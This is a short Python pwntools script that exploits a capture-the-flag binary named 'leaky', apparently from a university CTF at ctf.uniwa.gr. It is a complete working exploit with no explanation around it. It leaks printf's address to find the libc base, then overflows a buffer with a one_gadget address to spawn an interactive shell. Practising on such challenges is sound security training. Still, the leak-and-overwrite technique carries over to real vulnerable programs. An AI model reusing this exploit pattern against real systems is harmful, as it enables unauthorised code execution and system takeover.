#!/usr/bin/python3  
from pwn import *

ip = 'ctf.uniwa.gr' # change this
port = 2005 # change this
filename = './leaky' # change this

_libc = '/lib/x86_64-linux-gnu/libc.so.6' # change this

og = [0xcb79a, 0xcb79d, 0xcb7a0, 0xe926b] 

def pwn():
    #r = remote(ip, port)
    r = process(filename)
    e = ELF(filename)
    libc = ELF(_libc)
    
    ### Calculate the addresses ###
    printf_libc = libc.symbols['printf']
    main = p64(e.symbols['main'])
    junk = b'z'*24
    
    ### Stage 1: leaking ###
    payload = 'a cookie'
    r.sendlineafter('a present :)', payload)
    r.recvuntil(':')
    leaked = r.recvline()
    leaked = int(leaked, 16)
    log.success('Leaked printf: ' + hex(leaked))
    gdb.attach(r)

    ### Stage 2: Calculate libc_base and offsets ###
    base = leaked - printf_libc

    ### Stage 3: craft payload and get shell ###
    payload = junk + p64(base + og[0])
    r.sendlineafter('present??', payload)
    log.success('SHELL OBTAINED SUCCESSFULLY!\n')
    r.interactive()

pwn()

